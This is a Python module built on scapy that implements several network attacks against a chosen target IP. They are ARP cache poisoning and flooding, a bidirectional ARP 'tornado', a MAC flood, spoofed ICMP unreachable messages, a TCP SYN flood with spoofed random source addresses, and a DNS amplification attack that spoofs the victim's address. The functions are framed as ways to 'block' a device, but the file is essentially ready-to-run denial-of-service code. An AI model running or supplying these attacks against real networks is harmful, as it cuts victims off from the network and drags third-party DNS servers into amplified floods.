import time
from scapy.all import ARP, send, sendp, IP, ICMP, RandMAC, RandIP, RandShort

def get_gateway_ip(network):
    """
    Returns the gateway IP address for a given network.
    The gateway is assumed to be the first usable IP in the network (network_address + 1).
    """
    return str(network.network_address + 1)

def block_via_arp_poison(target_ip, network, block_duration=60, interval=2, log_callback=None):
    """
    Blocks a target IP by sending ARP responses that poison the target's ARP cache.
    This method sends ARP responses claiming the gateway's IP is associated with a non-existent MAC.
    """
    gateway_ip = get_gateway_ip(network)
    arp_resp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc="00:00:00:00:00:00")
    if log_callback:
        log_callback(f"Starting ARP Poisoning on {target_ip} for {block_duration} seconds...")
    end_time = time.time() + block_duration
    count = 0
    while time.time() < end_time:
        send(arp_resp, verbose=False)
        count += 1
        if log_callback and count % 5 == 0:
            log_callback(f"Sent {count} ARP poison packets to {target_ip}")
        time.sleep(interval)
    if log_callback:
        log_callback(f"Finished ARP Poisoning on {target_ip}.")

def block_via_arp_flood(target_ip, network, block_duration=60, interval=1, log_callback=None):
    """
    Blocks a target IP by flooding it with ARP responses.
    Similar to ARP poisoning but with a higher frequency of packets.
    """
    gateway_ip = get_gateway_ip(network)
    arp_resp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc="00:00:00:00:00:00")
    if log_callback:
        log_callback(f"Starting ARP Flooding on {target_ip} for {block_duration} seconds...")
    end_time = time.time() + block_duration
    count = 0
    while time.time() < end_time:
        send(arp_resp, verbose=False)
        count += 1
        if log_callback and count % 5 == 0:
            log_callback(f"Sent {count} ARP flood packets to {target_ip}")
        time.sleep(interval)
    if log_callback:
        log_callback(f"Finished ARP Flooding on {target_ip}.")

def block_via_arp_tornado(target_ip, network, block_duration=60, interval=2, log_callback=None):
    """
    Blocks a target IP by poisoning both the target's and gateway's ARP caches simultaneously.
    This creates a bidirectional block but is more aggressive and potentially unstable.
    """
    gateway_ip = get_gateway_ip(network)
    arp_to_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc="00:00:00:00:00:00")
    arp_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc="00:00:00:00:00:00")
    if log_callback:
        log_callback(f"Starting ARP Tornado on {target_ip} for {block_duration} seconds (unstable method)!")
    end_time = time.time() + block_duration
    count = 0
    while time.time() < end_time:
        send(arp_to_target, verbose=False)
        send(arp_to_gateway, verbose=False)
        count += 1
        if log_callback and count % 3 == 0:
            log_callback(f"Sent {count} ARP tornado packets for {target_ip}")
        time.sleep(interval)
    if log_callback:
        log_callback(f"Finished ARP Tornado on {target_ip}.")

def block_via_mac_flood(target_ip, network, block_duration=60, interval=0.1, log_callback=None):
    """
    Experimental method: Flood the network with Ethernet frames having random source MACs.
    WARNING: This method is highly unstable and likely to affect the entire LAN.
    """
    from scapy.all import sendp, RandMAC, Ether
    if log_callback:
        log_callback(f"Starting MAC Flooding on {target_ip} for {block_duration} seconds (unstable method)!")
    end_time = time.time() + block_duration
    count = 0
    while time.time() < end_time:
        frame = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
        sendp(frame, verbose=False)
        count += 1
        if log_callback and count % 10 == 0:
            log_callback(f"Sent {count} MAC flood frames")
        time.sleep(interval)
    if log_callback:
        log_callback(f"Finished MAC Flooding on {target_ip}.")

def block_via_icmp_unreachable(target_ip, network, block_duration=60, interval=1, log_callback=None):
    """
    Experimental method: Send continuous spoofed ICMP Destination Unreachable messages
    to the target. WARNING: This method may have limited effect and is unstable.
    """
    from scapy.all import IP, ICMP, send
    gateway_ip = get_gateway_ip(network)
    pkt = IP(dst=target_ip, src=gateway_ip) / ICMP(type=3, code=1)
    if log_callback:
        log_callback(f"Starting ICMP Unreachable on {target_ip} for {block_duration} seconds (unstable method)!")
    end_time = time.time() + block_duration
    count = 0
    while time.time() < end_time:
        send(pkt, verbose=False)
        count += 1
        if log_callback and count % 5 == 0:
            log_callback(f"Sent {count} ICMP unreachable messages to {target_ip}")
        time.sleep(interval)
    if log_callback:
        log_callback(f"Finished ICMP Unreachable on {target_ip}.")

def block_via_tcp_syn_flood(target_ip, target_port=80, block_duration=60, interval=0.01, log_callback=None):
    """
    Experimental method: Floods the target with TCP SYN packets, potentially overwhelming its connection queue.
    This is a more aggressive method that can be very effective but should be used with caution.
    """
    from scapy.all import IP, TCP, send
    if log_callback:
        log_callback(f"Starting TCP SYN Flood on {target_ip}:{target_port} for {block_duration} seconds!")
    
    end_time = time.time() + block_duration
    count = 0
    while time.time() < end_time:
        # Create a packet with random source IP and port
        pkt = IP(dst=target_ip, src=RandIP()) / TCP(dport=target_port, sport=RandShort(), flags="S")
        send(pkt, verbose=False)
        count += 1
        if log_callback and count % 100 == 0:
            log_callback(f"Sent {count} TCP SYN packets to {target_ip}:{target_port}")
        time.sleep(interval)
    if log_callback:
        log_callback(f"Finished TCP SYN Flood on {target_ip}:{target_port}.")

def block_via_dns_amplification(target_ip, dns_server, block_duration=60, interval=0.1, log_callback=None):
    """
    Experimental method: Uses DNS amplification attack by sending small DNS queries that generate large responses.
    This method can be very effective but requires a vulnerable DNS server.
    """
    from scapy.all import IP, UDP, DNS, DNSQR, send
    if log_callback:
        log_callback(f"Starting DNS Amplification attack on {target_ip} using DNS server {dns_server}!")
    
    # Create a DNS query that will generate a large response
    dns_query = IP(dst=dns_server, src=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY"))
    
    end_time = time.time() + block_duration
    count = 0
    while time.time() < end_time:
        send(dns_query, verbose=False)
        count += 1
        if log_callback and count % 10 == 0:
            log_callback(f"Sent {count} DNS amplification queries")
        time.sleep(interval)
    if log_callback:
        log_callback(f"Finished DNS Amplification attack on {target_ip}.")
